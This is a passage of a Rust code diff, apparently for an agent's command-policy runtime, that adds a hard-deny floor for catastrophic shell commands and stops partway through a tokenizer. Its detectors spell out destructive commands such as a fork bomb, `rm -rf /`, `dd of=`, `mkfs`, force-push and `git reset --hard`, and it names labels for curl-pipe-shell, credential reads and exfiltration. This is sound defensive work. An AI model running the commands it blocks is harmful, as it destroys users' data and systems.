@@ -32,6 +32,13 @@ pub struct CommandPolicy {
     pub default_shell_mode: String,
     pub deny_patterns: Vec<String>,
     pub require_approval: BTreeSet<String>,
+    /// Risk classes that are hard-denied (blocked before the child spawns) and
+    /// NEVER routed to the consent gate. Distinct from `require_approval`, whose
+    /// labels are consent-eligible. The built-in `catastrophic` label is always
+    /// hard-denied regardless of this set (the never-approvable command floor);
+    /// `deny_labels` lets a policy additionally promote other scanner labels
+    /// (e.g. `destructive`, `network_exfil`) to the same never-approvable tier.
+    pub deny_labels: BTreeSet<String>,
     pub pre: Option<Arc<VmClosure>>,
     pub post: Option<Arc<VmClosure>>,
     /// Optional consent gate for the `require_approval` disposition. When set,
@@ -143,6 +150,10 @@ pub fn parse_command_policy_value(
             .unwrap_or_default()
             .into_iter()
             .collect(),
+        deny_labels: string_list_field(map, "deny_labels")?
+            .unwrap_or_default()
+            .into_iter()
+            .collect(),
         pre: closure_field(map, "pre")?,
         post: closure_field(map, "post")?,
         consent: closure_field(map, "consent")?,
@@ -171,6 +182,9 @@ pub fn normalize_command_policy_value(config: &VmValue) -> Result<VmValue, VmErr
         .or_insert_with(|| VmValue::List(std::sync::Arc::new(Vec::new())));
     normalized
         .entry(crate::value::intern_key("require_approval"))
+        .or_insert_with(|| VmValue::List(std::sync::Arc::new(Vec::new())));
+    normalized
+        .entry(crate::value::intern_key("deny_labels"))
         .or_insert_with(|| VmValue::List(std::sync::Arc::new(Vec::new())));
     parse_command_policy_value(Some(&VmValue::dict(normalized.clone())), "command_policy")?;
     Ok(VmValue::dict(normalized))
@@ -298,6 +312,20 @@ pub async fn run_command_policy_preflight_with_ctx(
                     .unwrap_or(0.7),
             ));
         }
+    }
+
+    // Never-approvable command floor: enforced before deny-patterns and before
+    // any consent/approval routing. The child is never spawned and the decision
+    // is never sent to the consent gate.
+    if let Some(deny) = hard_deny_decision(&scan, &policy, &risk_labels_from_scan(&scan)) {
+        let msg = deny.reason.clone().unwrap_or_default();
+        decisions.push(deny);
+        return Ok(CommandPolicyPreflight::Blocked {
+            status: "blocked",
+            message: msg,
+            context,
+            decisions,
+        });
     }
 
     if let Some(matched) = first_deny_pattern(&policy, &context) {
@@ -474,6 +502,19 @@ pub async fn run_command_policy_preflight_with_ctx(
 
     if rewritten_by_hook {
         let scan = command_risk_scan_json(&context, Some(&policy));
+        // Re-apply the never-approvable floor to the rewritten command: a
+        // pre-hook rewrite must not be able to smuggle a catastrophic command
+        // past the floor.
+        if let Some(deny) = hard_deny_decision(&scan, &policy, &risk_labels_from_scan(&scan)) {
+            let msg = deny.reason.clone().unwrap_or_default();
+            decisions.push(deny);
+            return Ok(CommandPolicyPreflight::Blocked {
+                status: "blocked",
+                message: msg,
+                context,
+                decisions,
+            });
+        }
         if let Some(matched) = first_deny_pattern(&policy, &context) {
             let msg = format!("rewritten command denied by policy pattern {matched:?}");
             decisions.push(decision(
@@ -959,6 +1000,7 @@ fn command_context_json(
             "default_shell_mode": policy.default_shell_mode,
             "deny_patterns": policy.deny_patterns,
             "require_approval": policy.require_approval.iter().cloned().collect::<Vec<_>>(),
+            "deny_labels": policy.deny_labels.iter().cloned().collect::<Vec<_>>(),
             "ceiling": crate::orchestration::current_execution_policy(),
         },
         "tool_annotations": crate::orchestration::current_execution_policy()
@@ -1023,6 +1065,17 @@ pub fn command_risk_scan_json(ctx: &JsonValue, policy: Option<&CommandPolicy>) -
     let mut labels = BTreeSet::new();
     let mut rationale = Vec::new();
 
+    // Never-approvable command floor. A catastrophic classification is a
+    // hard-deny that is enforced before any consent/approval routing (see
+    // `run_command_policy_preflight_with_ctx`), so it is surfaced both as a
+    // distinct `catastrophic` label and as a `catastrophic_reason` string the
+    // preflight reads to block the command with burin's verbatim rationale.
+    let catastrophic_reason = catastrophic::reason(&command_text, &scan_workspace_roots(ctx));
+    if catastrophic_reason.is_some() {
+        labels.insert("catastrophic".to_string());
+        rationale.push("catastrophic (never-approvable) command detected");
+    }
+
     if has_destructive_tokens(&command_text) {
         labels.insert("destructive".to_string());
         rationale.push("destructive shell token or command detected");
@@ -1076,14 +1129,18 @@ pub fn command_risk_scan_json(ctx: &JsonValue, policy: Option<&CommandPolicy>) -
     } else if labels.iter().any(|label| {
         matches!(
             label.as_str(),
-            "destructive" | "curl_pipe_shell" | "credential_file_read" | "network_exfil"
+            "catastrophic"
+                | "destructive"
+                | "curl_pipe_shell"
+                | "credential_file_read"
+                | "network_exfil"
         )
     }) {
         "deny"
     } else {
         "require_approval"
     };
-    serde_json::json!({
+    let mut scan = serde_json::json!({
         "action": recommended,
         "recommended_action": recommended,
         "risk_labels": labels,
@@ -1093,7 +1150,67 @@ pub fn command_risk_scan_json(ctx: &JsonValue, policy: Option<&CommandPolicy>) -
         } else {
             rationale.join("; ")
         },
-    })
+    });
+    if let Some(reason) = catastrophic_reason {
+        scan["catastrophic_reason"] = JsonValue::String(reason);
+    }
+    scan
+}
+
+/// Workspace roots the catastrophic floor uses to judge whether an `rm -rf`
+/// target escapes the workspace. Mirrors the roots the context builder already
+/// populates (`command_context_json`): the policy roots when set, otherwise the
+/// execution root. An empty result makes the floor treat every absolute path as
+/// an escape (conservative), matching burin's `project_root: None` behavior.
+fn scan_workspace_roots(ctx: &JsonValue) -> Vec<String> {
+    ctx.get("workspace_roots")
+        .and_then(|value| value.as_array())
+        .map(|roots| {
+            roots
+                .iter()
+                .filter_map(|root| root.as_str().map(ToString::to_string))
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// A never-approvable hard-deny for the catastrophic floor or a policy
+/// `deny_labels` entry. Returns the blocking decision to append, if any. This is
+/// evaluated before the consent/approval routing and is NEVER sent through the
+/// consent gate: a catastrophic command is never approvable, and `deny_labels`
+/// promotes the named scanner labels to the same never-approvable tier. The
+/// `catastrophic` label is always enforced regardless of policy configuration.
+fn hard_deny_decision(
+    scan: &JsonValue,
+    policy: &CommandPolicy,
+    risk_labels: &[String],
+) -> Option<CommandPolicyDecision> {
+    if let Some(reason) = scan
+        .get("catastrophic_reason")
+        .and_then(|value| value.as_str())
+    {
+        return Some(decision(
+            "deny",
+            Some(reason.to_string()),
+            "catastrophic_floor",
+            risk_labels.to_vec(),
+            1.0,
+        ));
+    }
+    if let Some(label) = risk_labels
+        .iter()
+        .find(|label| policy.deny_labels.contains(label.as_str()))
+    {
+        let msg = format!("command hard-denied by policy deny_labels for risk class {label}");
+        return Some(decision(
+            "deny",
+            Some(msg),
+            "deny_labels",
+            risk_labels.to_vec(),
+            1.0,
+        ));
+    }
+    None
 }
 
 fn first_deny_pattern(policy: &CommandPolicy, ctx: &JsonValue) -> Option<String> {
@@ -1142,7 +1259,10 @@ fn has_destructive_tokens(text: &str) -> bool {
     lower.contains("rm -rf /")
         || lower.contains("rm -fr /")
         || lower.contains("mkfs")
-        || lower.contains("dd if=")
+        // A raw-device/file overwrite is `dd of=…`; the input side (`dd if=…`)
+        // is a read and is not destructive on its own. (The catastrophic floor
+        // independently hard-denies `dd of=…`.)
+        || lower.contains("dd of=")
         || lower.contains(":(){")
         || lower.contains("chmod -r 777 /")
         || lower.contains("chown -r ")
@@ -1966,6 +2086,994 @@ fn sha256_hex(bytes: &[u8]) -> String {
     format!("sha256:{}", hex::encode(Sha256::digest(bytes)))
 }
 
+/// The never-approvable command floor: a Rust port of burin's twin
+/// catastrophic-command classifier (Swift `CommandSafetyChecker+Floor` and Rust
+/// `destructive_command::catastrophic_command_reason`, kept in cross-language
+/// parity). A command that this module flags is HARD-DENIED before the child
+/// spawns and is never routed to the consent gate — it is a floor, not a
+/// consent-eligible risk label.
+///
+/// The classifier is intentionally precision-over-recall and is NOT a security
+/// boundary; it catches the obvious irreversible-destruction shapes (fork bomb,
+/// `git reset --hard` / `git clean -fd` / force-push, `rm -rf` escaping the
+/// workspace root or wiping it in place, `dd of=`, `mkfs`, `chmod -R 000`,
+/// `truncate -s 0` of a source file, and `>`/`>>` redirection onto a source
+/// file) through adversarial quoting, chained-command splitting, `bash -c`
+/// recursion, and the `sudo`/`env`/`nice`/`nohup`/`time`/`timeout`/`command`/
+/// `builtin` wrapper family.
+mod catastrophic {
+    /// Maximum `bash -c` recursion depth. Each level strips a shell wrapper, so
+    /// the string strictly shrinks; the cap is a defensive bound only.
+    const MAX_DEPTH: usize = 8;
+
+    const PROJECT_DELETE_REASON: &str =
+        "destructive recursive deletion of the project root is blocked";
+
+    /// Classify `command` against the floor. `workspace_roots` are the absolute
+    /// workspace roots (an `rm -rf` target is an escape unless it resolves
+    /// inside one of them); an empty slice means "no root context", under which
+    /// every absolute path is conservatively treated as an escape.
+    pub(super) fn reason(command: &str, workspace_roots: &[String]) -> Option<String> {
+        reason_inner(command, workspace_roots, 0)
+    }
+
+    fn reason_inner(command: &str, roots: &[String], depth: usize) -> Option<String> {
+        if depth > MAX_DEPTH {
+            return None;
+        }
+        // Fork bomb is checked on the WHOLE command first: splitting on `;`/`&`
+        // would tear `:(){ :|:& };:` apart before it can be recognized.
+        if is_fork_bomb(command) {
+            return Some(
+                "fork bomb (`:(){ :|:& };:`) is blocked: it would exhaust the machine".to_string(),
+            );
+        }
+        for segment in split_chained_command(command) {
+            if let Some(reason) = segment_catastrophe(&segment, roots, depth) {
+                return Some(reason);
+            }
+            if segment_deletes_project(&segment) {
+                return Some(PROJECT_DELETE_REASON.to_string());
+            }
+        }
+        None
+    }
+
+    fn segment_catastrophe(segment: &str, roots: &[String], depth: usize) -> Option<String> {
+        // Redirect-onto-source is a whole-segment property → check raw text.
+        if let Some(reason) = redirect_over_source_reason(segment) {
+            return Some(reason);
+        }
+        if is_fork_bomb(segment) {
+            return Some(
+                "fork bomb (`:(){ :|:& };:`) is blocked: it would exhaust the machine".to_string(),
+            );
+        }
+        let tokens = shell_words(segment);
+        let mut start = 0;
+        while start < tokens.len() {
+            let end = next_pipeline_boundary(&tokens, start);
+            if let Some(reason) = invocation_catastrophe(&tokens, start, end, roots, depth) {
+                return Some(reason);
+            }
+            start = end + 1;
+        }
+        None
+    }
+
+    fn invocation_catastrophe(
+        tokens: &[String],
+        start: usize,
+        end: usize,
+        roots: &[String],
+        depth: usize,
+    ) -> Option<String> {
+        let command_index = unwrapped_command_index(tokens, start, end);
+        if command_index >= end {
+            return None;
+        }
+        let argv = &tokens[command_index..end];
+        let command = command_basename(&argv[0]);
+        let args = &argv[1..];
+
+        // bash/sh/zsh -c '<script>' → recurse into the inner script.
+        if matches!(command, "bash" | "sh" | "zsh") {
+            if let Some(script) = shell_c_script(args) {
+                if let Some(reason) = reason_inner(script, roots, depth + 1) {
+                    return Some(reason);
+                }
+            }
+        }
+
+        match command {
+            "git" => git_catastrophe(args),
+            "rm" => rm_escape_catastrophe(args, roots),
+            "dd" => dd_catastrophe(args),
+            "mkfs" | "mke2fs" => Some(format!(
+                "`{command}` (filesystem format) is blocked: it would destroy a device"
+            )),
+            _ if command.starts_with("mkfs.") => Some(format!(
+                "`{command}` (filesystem format) is blocked: it would destroy a device"
+            )),
+            "chmod" => chmod_catastrophe(args),
+            "truncate" => truncate_catastrophe(args),
+            _ => None,
+        }
+    }
+
+    // -c detection: skip `--`, scan short-flag clusters for 'c', return the NEXT
+    // token as the script.
+    fn shell_c_script(args: &[String]) -> Option<&str> {
+        let mut index = 0;
+        while index < args.len() {
+            let token = &args[index];
+            if token == "--" {
+                index += 1;
+                continue;
+            }
+            if token.starts_with('-') && token != "-" {
+                if token.chars().skip(1).any(|flag| flag == 'c') {
+                    return args.get(index + 1).map(String::as_str);
+                }
+                index += 1;
+                continue;
+            }
+            return None;
+        }
+        None
+    }
+
+    fn git_catastrophe(args: &[String]) -> Option<String> {
+        // Skip leading git global options; value-taking ones consume a token.
+        let mut index = 0;
+        while index < args.len() {
+            let token = &args[index];
+            match token.as_str() {
+                "-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace" => {
+                    index += 2;
+                    continue;
+                }
+                _ if token.starts_with('-') => {
+                    index += 1;
+                    continue;
+                }
+                _ => break,
+            }
+        }
+        let subcommand = args.get(index)?.as_str();
+        let rest = &args[(index + 1).min(args.len())..];
+        match subcommand {
+            "reset" => rest.iter().any(|a| a == "--hard").then(|| {
+                "`git reset --hard` is blocked: it discards all uncommitted work. Commit or stash first, then reset on a feature branch.".to_string()
+            }),
+            "clean" => {
+                let mut force = false;
+                let mut dirs = false;
+                for arg in rest {
+                    if arg == "--force" {
+                        force = true;
+                    } else if arg == "-d" || arg == "--directory" {
+                        dirs = true;
+                    } else if arg.starts_with('-') && !arg.starts_with("--") {
+                        for flag in arg.chars().skip(1) {
+                            match flag {
+                                'f' => force = true,
+                                'd' => dirs = true,
+                                _ => {}
+                            }
+                        }
+                    }
+                }
+                (force && dirs).then(|| {
+                    "`git clean -fd`/`-fdx` is blocked: it permanently deletes untracked files and directories. Inspect with `git clean -nd` first, or remove specific paths.".to_string()
+                })
+            }
+            "push" => {
+                let force = rest.iter().any(|a| {
+                    a == "--force"
+                        || a == "-f"
+                        || a == "--force-with-lease"
+                        || a.starts_with("--force-with-lease=")
+                        || (a.starts_with('-') && !a.starts_with("--") && a.contains('f'))
+                });
+                force.then(|| {
+                    "force-push (`git push --force` / `-f` / `--force-with-lease`) is blocked: it can rewrite shared history. Push without `--force`, or perform the force-push yourself after review.".to_string()
+                })
+            }
+            _ => None,
+        }
+    }
+
+    fn rm_escape_catastrophe(args: &[String], roots: &[String]) -> Option<String> {
+        let mut force = false;
+        let mut recursive = false;
+        let mut targets: Vec<&str> = Vec::new();
+        let mut parsing_options = true;
+        for arg in args {
+            if parsing_options && arg == "--" {
+                parsing_options = false;
+                continue;
+            }
+            if parsing_options && arg.starts_with("--") {
+                force = force || arg == "--force";
+                recursive = recursive || arg == "--recursive";
+                continue;
+            }
+            if parsing_options && arg.starts_with('-') && arg != "-" {
+                for flag in arg.chars().skip(1) {
+                    force = force || flag == 'f';
+                    recursive = recursive || flag == 'r' || flag == 'R';
+                }
+                continue;
+            }
+            parsing_options = false;
+            targets.push(arg);
+        }
+        if !(force && recursive) {
+            return None;
+        }
+        for target in targets {
+            if path_escapes_root(target, roots) {
+                return Some(format!(
+                    "`rm -rf` of `{target}` is blocked: it targets an absolute path or escapes the project root. Delete only paths inside the workspace, and prefer a scoped removal."
+                ));
+            }
+        }
+        None
+    }
+
+    fn dd_catastrophe(args: &[String]) -> Option<String> {
+        args.iter().any(|a| a.starts_with("of=")).then(|| {
+            "`dd of=…` is blocked: a raw block-device/file overwrite is irreversible.".to_string()
+        })
+    }
+
+    fn chmod_catastrophe(args: &[String]) -> Option<String> {
+        let recursive = args.iter().any(|a| {
+            a == "-R"
+                || a == "--recursive"
+                || (a.starts_with('-') && !a.starts_with("--") && a.contains('R'))
+        });
+        let strips_all = args.iter().any(|a| a == "000" || a == "0000");
+        (recursive && strips_all).then(|| {
+            "`chmod -R 000` is blocked: recursively stripping all permissions can lock you out of the tree.".to_string()
+        })
+    }
+
+    fn truncate_catastrophe(args: &[String]) -> Option<String> {
+        // `-s 0`, `-s0`, `--size 0`, `--size=0`; a leading +/- on the size is
+        // stripped so `-s +0` / `-s -0` also count as zero.
+        let mut size_zero = false;
+        let mut targets: Vec<&str> = Vec::new();
+        let mut index = 0;
+        while index < args.len() {
+            let arg = &args[index];
+            if arg == "-s" || arg == "--size" {
+                if args
+                    .get(index + 1)
+                    .map(|v| v.trim_start_matches(['+', '-']))
+                    == Some("0")
+                {
+                    size_zero = true;
+                }
+                index += 2;
+                continue;
+            }
+            if let Some(value) = arg.strip_prefix("-s") {
+                if value.trim_start_matches(['+', '-']) == "0" {
+                    size_zero = true;
+                }
+                index += 1;
+                continue;
+            }
+            if let Some(value) = arg.strip_prefix("--size=") {
+                if value.trim_start_matches(['+', '-']) == "0" {
+                    size_zero = true;
+                }
+                index += 1;
+                continue;
+            }
+            if !arg.starts_with('-') {
+                targets.push(arg);
+            }
+            index += 1;
+        }
+        (size_zero && targets.iter().any(|t| is_source_path(t))).then(|| {
+            "`truncate -s 0` of a source file is blocked: it would erase the file's contents. Use the edit tool to rewrite it.".to_string()
+        })
+    }
+
+    fn redirect_over_source_reason(segment: &str) -> Option<String> {
+        let chars: Vec<char> = segment.chars().collect();
+        let mut in_single = false;
+        let mut in_double = false;
+        let mut index = 0;
+        while index < chars.len() {
+            let ch = chars[index];
+            match ch {
+                '\\' if !in_single => {
+                    index += 2;
+                    continue;
+                }
+                '\'' if !in_double => in_single = !in_single,
+                '"' if !in_single => in_double = !in_double,
+                '>' if !in_single && !in_double => {
+                    let mut cursor = index + 1;
+                    if cursor < chars.len() && chars[cursor] == '>' {
+                        cursor += 1; // `>>` append
+                    }
+                    while cursor < chars.len() && chars[cursor].is_whitespace() {
+                        cursor += 1;
+                    }
+                    if cursor < chars.len() && chars[cursor] == '&' {
+                        // `>&2` fd duplication, not a file write — skip.
+                        index = cursor + 1;
+                        continue;
+                    }
+                    let mut target = String::new();
+                    while cursor < chars.len() && !chars[cursor].is_whitespace() {
+                        let tc = chars[cursor];
+                        if tc == '\'' || tc == '"' {
+                            cursor += 1;
+                            continue;
+                        }
+                        target.push(tc);
+                        cursor += 1;
+                    }
+                    if is_source_path(&target) {
+                        return Some(format!(
+                            "shell redirection (`>`/`>>`) onto the source file `{target}` is blocked: it bypasses the reviewable edit pipeline and risks corrupting the file. Use the edit tool to change source files."
+                        ));
+                    }
+                    index = cursor;
+                    continue;
+                }
+                _ => {}
+            }
+            index += 1;
+        }
+        None
+    }
+
+    fn is_fork_bomb(segment: &str) -> bool {
+        let compact: String = segment.chars().filter(|c| !c.is_whitespace()).collect();
+        compact.contains(":(){:|:&};:") || compact.contains(":(){:|:&;}:")
+    }
+
+    fn path_escapes_root(target: &str, roots: &[String]) -> bool {
+        let cleaned = strip_trailing_slashes(target);
+        if cleaned.is_empty() {
+            return false;
+        }
+        // Home / root / device targets always escape regardless of root.
+        if cleaned == "~"
+            || cleaned.starts_with("~/")
+            || cleaned == "/"
+            || cleaned == "/*"
+            || cleaned.starts_with("$HOME")
+            || cleaned.starts_with("${HOME}")
+        {
+            return true;
+        }
+        if cleaned.starts_with('/') {
+            // Absolute: escapes UNLESS it resolves inside one of the roots. No
+            // root context → conservatively treat as an escape.
+            if roots.is_empty() {
+                return true;
+            }
+            return !roots.iter().any(|root| {
+                let root = strip_trailing_slashes(root);
+                cleaned == root || cleaned.starts_with(&format!("{root}/"))
+            });
+        }
+        relative_path_escapes(cleaned)
+    }
+
+    fn relative_path_escapes(path: &str) -> bool {
+        let mut depth: i32 = 0;
+        for part in path.split('/') {
+            match part {
+                "" | "." => {}
+                ".." => {
+                    depth -= 1;
+                    if depth < 0 {
+                        return true;
+                    }
+                }
+                _ => depth += 1,
+            }
+        }
+        false
+    }
+
+    fn strip_trailing_slashes(value: &str) -> &str {
+        let mut end = value.len();
+        while end > 1 && value.as_bytes()[end - 1] == b'/' {
+            end -= 1;
+        }
+        &value[..end]
+    }
+
+    fn is_source_path(target: &str) -> bool {
+        let cleaned = strip_trailing_slashes(target);
+        let name = cleaned.rsplit(['/', '\\']).next().unwrap_or(cleaned);
+        let Some(dot) = name.rfind('.') else {
+            return false;
+        };
+        let ext = &name[dot + 1..];
+        matches!(
+            ext,
+            "rs" | "swift"
+                | "ts"
+                | "tsx"
+                | "js"
+                | "jsx"
+                | "mjs"
+                | "cjs"
+                | "py"
+                | "go"
+                | "java"
+                | "kt"
+                | "c"
+                | "h"
+                | "cc"
+                | "cpp"
+                | "cxx"
+                | "hpp"
+                | "hh"
+                | "m"
+                | "mm"
+                | "rb"
+                | "php"
+                | "cs"
+                | "scala"
+                | "zig"
+                | "ml"
+                | "hs"
+                | "ex"
+                | "exs"
+                | "erl"
+                | "lua"
+                | "dart"
+                | "harn"
+                | "sh"
+                | "bash"
+                | "sql"
+        )
+    }
+
+    // ---- In-root project-wipe family (`rm -rf .` / `*` / `${PWD}/*` / … ) ----
+
+    fn segment_deletes_project(segment: &str) -> bool {
+        let tokens = shell_words(segment);
+        let mut start = 0;
+        while start < tokens.len() {
+            let end = next_pipeline_boundary(&tokens, start);
+            if invocation_deletes_project(&tokens, start, end) {
+                return true;
+            }
+            start = end + 1;
+        }
+        false
+    }
+
+    fn invocation_deletes_project(tokens: &[String], start: usize, end: usize) -> bool {
+        let mut command_index = unwrapped_command_index(tokens, start, end);
+        if command_index >= end {
+            return false;
+        }
+        let command = command_basename(&tokens[command_index]);
+        if shell_c_invocation_deletes_project(command, tokens, command_index, end) {
+            return true;
+        }
+        if command != "rm" {
+            return false;
+        }
+        command_index += 1;
+        let mut saw_force = false;
+        let mut saw_recursive = false;
+        let mut saw_project_target = false;
+        let mut parsing_options = true;
+        while command_index < end {
+            let token = &tokens[command_index];
+            if parsing_options && token == "--" {
+                parsing_options = false;
+                command_index += 1;
+                continue;
+            }
+            if parsing_options && token.starts_with("--") {
+                saw_force = saw_force || token == "--force";
+                saw_recursive = saw_recursive || token == "--recursive";
+                command_index += 1;
+                continue;
+            }
+            if parsing_options && token.starts_with('-') && token != "-" {
+                for flag in token.chars().skip(1) {
+                    saw_force = saw_force || flag == 'f';
+                    saw_recursive = saw_recursive || flag == 'r' || flag == 'R';
+                }
+                command_index += 1;
+                continue;
+            }
+            parsing_options = false;
+            saw_project_target = saw_project_target || is_project_target(token);
+            command_index += 1;
+        }
+        saw_force && saw_recursive && saw_project_target
+    }
+
+    fn shell_c_invocation_deletes_project(
+        command: &str,
+        tokens: &[String],
+        command_index: usize,
+        end: usize,
+    ) -> bool {
+        if !matches!(command, "bash" | "sh" | "zsh") {
+            return false;
+        }
+        let mut index = command_index + 1;
+        while index < end {
+            let token = &tokens[index];
+            if token == "--" {
+                index += 1;
+                continue;
+            }
+            if token.starts_with('-') && token != "-" {
+                if token.chars().skip(1).any(|flag| flag == 'c') {
+                    return tokens
+                        .get(index + 1)
+                        .map(|script| segment_deletes_project(script))
+                        .unwrap_or(false);
+                }
+                index += 1;
+                continue;
+            }
+            return false;
+        }
+        false
+    }
+
+    fn is_project_target(token: &str) -> bool {
+        let value = strip_trailing_slashes(token);
+        is_dot_path(value)
+            || is_current_directory_reference(value)
+            || is_current_directory_contents_glob(value)
+    }
+
+    fn is_dot_path(value: &str) -> bool {
+        let mut remainder = value;
+        while let Some(next) = remainder.strip_prefix("./") {
+            remainder = next;
+        }
+        remainder == "."
+    }
+
+    fn is_current_directory_reference(value: &str) -> bool {
+        matches!(
+            value,
+            "$PWD" | "$PWD/." | "$(pwd)" | "$(pwd)/." | "`pwd`" | "`pwd`/."
+        ) || pwd_parameter_expansion_suffix(value)
+            .map(|suffix| suffix.is_empty() || suffix == "/.")
+            .unwrap_or(false)
+    }
+
+    fn is_current_directory_contents_glob(value: &str) -> bool {
+        if is_bare_current_directory_contents_glob(value) {
+            return true;
+        }
+        for prefix in ["$PWD/", "${PWD}/", "$(pwd)/", "`pwd`/"] {
+            if let Some(suffix) = value.strip_prefix(prefix) {
+                return is_bare_current_directory_contents_glob(suffix);
+            }
+        }
+        if let Some(suffix) =
+            pwd_parameter_expansion_suffix(value).and_then(|s| s.strip_prefix('/'))
+        {
+            return is_bare_current_directory_contents_glob(suffix);
+        }
+        false
+    }
+
+    fn pwd_parameter_expansion_suffix(value: &str) -> Option<&str> {
+        let rest = value.strip_prefix("${PWD")?;
+        if let Some(suffix) = rest.strip_prefix('}') {
+            return Some(suffix);
+        }
+        let yields_pwd_when_set = [":-", "-", ":?", "?", ":=", "="];
+        if !yields_pwd_when_set.iter().any(|op| rest.starts_with(op)) {
+            return None;
+        }
+        let close = rest.find('}')?;
+        Some(&rest[close + 1..])
+    }
+
+    fn is_bare_current_directory_contents_glob(value: &str) -> bool {
+        let mut remainder = value;
+        while let Some(next) = remainder.strip_prefix("./") {
+            remainder = next;
+        }
+        matches!(
+            remainder,
+            "*" | ".*" | ".?*" | ".??*" | ".[!.]*" | "..?*" | "**" | "**/*"
+        ) || is_brace_expanded_current_directory_contents_glob(remainder)
+    }
+
+    fn is_brace_expanded_current_directory_contents_glob(value: &str) -> bool {
+        let Some(body) = value.strip_prefix('{').and_then(|v| v.strip_suffix('}')) else {
+            return false;
+        };
+        let broad = ["*", ".*", ".?*", ".??*", ".[!.]*", "..?*", "**", "**/*"];
+        body.split(',').any(|pattern| broad.contains(&pattern))
+    }
+
+    // ---- Wrapper unwrapping (superset of both twins) ----
+
+    fn unwrapped_command_index(tokens: &[String], start: usize, end: usize) -> usize {
+        let mut index = start;
+        while index < end {
+            if is_shell_assignment(&tokens[index]) {
+                index += 1;
+                continue;
+            }
+            let next = match command_basename(&tokens[index]) {
+                "command" => skip_command_wrapper(tokens, index + 1, end),
+                "builtin" | "nohup" => index + 1,
+                "sudo" => skip_sudo_wrapper(tokens, index + 1, end),
+                "env" => skip_env_wrapper(tokens, index + 1, end),
+                "nice" => skip_nice_wrapper(tokens, index + 1, end),
+                "time" => skip_time_wrapper(tokens, index + 1, end),
+                "timeout" => skip_timeout_wrapper(tokens, index + 1, end),
+                _ => return index,
+            };
+            if next <= index {
+                return index;
+            }
+            index = next;
+        }
+        index
+    }
+
+    fn skip_command_wrapper(tokens: &[String], start: usize, end: usize) -> usize {
+        let mut index = start;
+        while index < end {
+            let token = &tokens[index];
+            if token == "--" {
+                return index + 1;
+            }
+            if !token.starts_with('-') || token == "-" {
+                break;
+            }
+            let flags: Vec<char> = token.chars().skip(1).collect();
+            if flags.iter().any(|f| *f == 'v' || *f == 'V') {
+                // `command -v rm` prints a path, it does not execute.
+                return end;
+            }
+            if !flags.iter().all(|f| *f == 'p') {
+                break;
+            }
+            index += 1;
+        }
+        index
+    }
+
+    fn skip_sudo_wrapper(tokens: &[String], start: usize, end: usize) -> usize {
+        let mut index = start;
+        while index < end {
+            let token = &tokens[index];
+            if token == "--" {
+                return index + 1;
+            }
+            if !token.starts_with('-') {
+                break;
+            }
+            index += 1;
+            if sudo_option_consumes_argument(token) && index < end {
+                index += 1;
+            }
+        }
+        index
+    }
+
+    fn skip_env_wrapper(tokens: &[String], start: usize, end: usize) -> usize {
+        let mut index = start;
+        while index < end {
+            let token = &tokens[index];
+            if token == "--" {
+                return index + 1;
+            }
+            if is_shell_assignment(token) {
+                index += 1;
+                continue;
+            }
+            if !token.starts_with('-') {
+                break;
+            }
+            index += 1;
+            if env_option_consumes_argument(token) && index < end {
+                index += 1;
+            }
+        }
+        index
+    }
+
+    fn skip_nice_wrapper(tokens: &[String], start: usize, end: usize) -> usize {
+        let mut index = start;
+        while index < end {
+            let token = &tokens[index];
+            if token == "--" {
+                return index + 1;
+            }
+            if token == "-n" && index + 1 < end {
+                index += 2;
+                continue;
+            }
+            if token.starts_with("-n") || token.starts_with("--adjustment=") {
+                index += 1;
+                continue;
+            }
+            if is_nice_numeric_priority(token) {
+                index += 1;
+                continue;
+            }
+            if token.starts_with('-') && token != "-" {
+                index += 1;
+                continue;
+            }
+            break;
+        }
+        index
+    }
+
+    fn skip_time_wrapper(tokens: &[String], start: usize, end: usize) -> usize {
+        let mut index = start;
+        while index < end {
+            let token = &tokens[index];
+            if token == "--" {
+                return index + 1;
+            }
+            if !token.starts_with('-') {
+                break;
+            }
+            index += 1;
+            if time_option_consumes_argument(token) && index < end {
+                index += 1;
+            }
+        }
+        index
+    }
+
+    fn skip_timeout_wrapper(tokens: &[String], start: usize, end: usize) -> usize {
+        let mut index = start;
+        while index < end {
+            let token = &tokens[index];
+            if token == "--" {
+                index += 1;
+                break;
+            }
+            if !token.starts_with('-') {
+                break;
+            }
+            index += 1;
+            if timeout_option_consumes_argument(token) && index < end {
+                index += 1;
+            }
+        }
+        // The first non-option token is the DURATION and is also consumed.
+        if index < end {
+            index += 1;
+        }
+        index
+    }
+
+    fn sudo_option_consumes_argument(option: &str) -> bool {
+        matches!(
+            option,
+            "-C" | "-D"
+                | "-g"
+                | "-h"
+                | "-p"
+                | "-t"
+                | "-T"
+                | "-u"
+                | "--close-from"
+                | "--group"
+                | "--host"
+                | "--prompt"
+                | "--role"
+                | "--type"
+                | "--user"
+        )
+    }
+
+    fn env_option_consumes_argument(option: &str) -> bool {
+        matches!(
+            option,
+            "-C" | "-S" | "-u" | "--chdir" | "--split-string" | "--unset"
+        )
+    }
+
+    fn time_option_consumes_argument(option: &str) -> bool {
+        matches!(option, "-f" | "-o" | "--format" | "--output")
+    }
+
+    fn timeout_option_consumes_argument(option: &str) -> bool {
+        matches!(option, "-s" | "--signal" | "-k" | "--kill-after")
+    }
+
+    fn is_nice_numeric_priority(token: &str) -> bool {
+        let Some(rest) = token.strip_prefix(['-', '+']) else {
+            return false;
+        };
+        !rest.is_empty() && rest.bytes().all(|b| b.is_ascii_digit())
+    }
+
+    fn is_shell_assignment(token: &str) -> bool {
+        let Some((name, _)) = token.split_once('=') else {
+            return false;
+        };
+        let mut chars = name.chars();
+        let Some(first) = chars.next() else {
+            return false;
+        };
+        (first == '_' || first.is_ascii_alphabetic())
+            && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
+    }
+
+    fn command_basename(token: &str) -> &str {
+        token.rsplit(['/', '\\']).next().unwrap_or(token)
+    }
+
+    // ---- Tokenizer and chained-command splitter (quote-normalizing) ----
+
+    fn shell_words(command: &str) -> Vec<String> {
+        let mut tokens = Vec::new();
+        let mut current = String::new();
+        let mut in_single_quote = false;
+        let mut in_double_quote = false;
+        let mut escaping = false;
+        for ch in command.chars() {
+            if escaping {
+                current.push(ch);
+                escaping = false;
+                continue;
+            }
+            if ch == '\\' && !in_single_quote {
+                escaping = true;
+                continue;
+            }
+            if ch == '\'' && !in_double_quote {
+                in_single_quote = !in_single_quote;
+                continue;
+            }
+            if ch == '"' && !in_single_quote {
+                in_double_quote = !in_double_quote;
+                continue;
+            }
